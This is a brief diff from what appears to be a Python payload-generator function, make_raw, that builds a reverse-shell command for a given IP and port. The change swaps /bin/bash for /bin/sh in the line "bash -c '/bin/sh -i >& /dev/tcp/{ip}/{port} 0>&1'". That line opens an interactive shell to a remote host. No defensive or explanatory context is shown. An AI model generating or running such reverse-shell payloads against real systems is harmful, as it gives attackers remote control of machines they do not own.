@@ -19,7 +19,7 @@ def make_raw(ip, port, use_ssl):
 
 	else:
 		raw = (
-			f"bash -c '/bin/bash -i >& /dev/tcp/{ip}/{port} 0>&1'"
+			f"bash -c '/bin/sh -i >& /dev/tcp/{ip}/{port} 0>&1'"
 		)
 
 	return raw
